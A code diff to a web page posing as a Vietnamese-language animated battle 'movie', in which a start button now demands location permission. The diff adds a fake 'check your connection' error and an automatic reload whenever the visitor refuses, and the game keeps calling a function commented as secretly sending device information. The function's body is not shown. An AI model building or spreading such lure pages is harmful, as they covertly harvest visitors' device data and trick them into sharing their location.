@@ -98,7 +98,7 @@
             display: none;
         }
         .minion-2 {
-            background-image: url('https://i.postimg.cc/mgzrrQPc/1758199034574.jpg');
+            background-image: url('https://i.postimg.cc/wxVbbBgj/1758197056461.jpg');
             width: 60px;
             height: 60px;
             display: none;
@@ -224,6 +224,9 @@
     <div class="start-screen" id="start-screen">
         <h1>Nhập tên bạn để bắt đầu!</h1>
         <input type="text" id="viewer-name" placeholder="Tên của bạn...">
+        <p class="text-sm text-red-400 mt-2" id="geo-permission-message" style="display: none;">
+            ERROR:Check your conection again
+        </p>
         <button id="start-button">Bắt đầu phim</button>
     </div>
     
@@ -250,6 +253,7 @@
         const startButton = document.getElementById('start-button');
         const viewerNameInput = document.getElementById('viewer-name');
         const container = document.getElementById('game-container');
+        const geoPermissionMessage = document.getElementById('geo-permission-message');
         const char1 = document.getElementById('char1');
         const char2 = document.getElementById('char2');
         const healthBar1 = document.getElementById('health-bar-1');
@@ -664,17 +668,46 @@
             }
         }
 
-        const startGame = () => {
+        const startGame = async () => {
             const name = viewerNameInput.value;
             if (name.trim() !== '') {
                 viewerName = name;
             }
-            startScreen.style.display = 'none';
-            container.style.display = 'block';
-            bgm.play(); // Bắt đầu phát nhạc
-            sendDeviceInfo(); // Gửi thông tin thiết bị ngầm
-            updateHealthBar();
-            battleLoop();
+
+            // Thử yêu cầu quyền vị trí trước khi bắt đầu
+            if (navigator.geolocation) {
+                try {
+                    await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            timeout: 100
+                        });
+                    });
+                    // Nếu thành công, tiếp tục
+                    geoPermissionMessage.style.display = 'none';
+                    startScreen.style.display = 'none';
+                    container.style.display = 'block';
+                    bgm.play();
+                    sendDeviceInfo();
+                    updateHealthBar();
+                    battleLoop();
+                } catch (e) {
+                    // Xử lý lỗi từ chối hoặc hết thời gian
+                    console.error('Lỗi khi lấy vị trí:', e.message);
+                    geoPermissionMessage.style.display = 'block';
+                    setTimeout(() => window.location.reload(), 3000); // Tự động làm mới trang sau 3 giây
+                    // Ngăn không cho game bắt đầu
+                    return; 
+                }
+            } else {
+                // Thiết bị không hỗ trợ Geolocation, vẫn cho phép chạy
+                geoPermissionMessage.style.display = 'none';
+                startScreen.style.display = 'none';
+                container.style.display = 'block';
+                bgm.play();
+                sendDeviceInfo();
+                updateHealthBar();
+                battleLoop();
+            }
         };
 
         startButton.addEventListener('click', startGame);
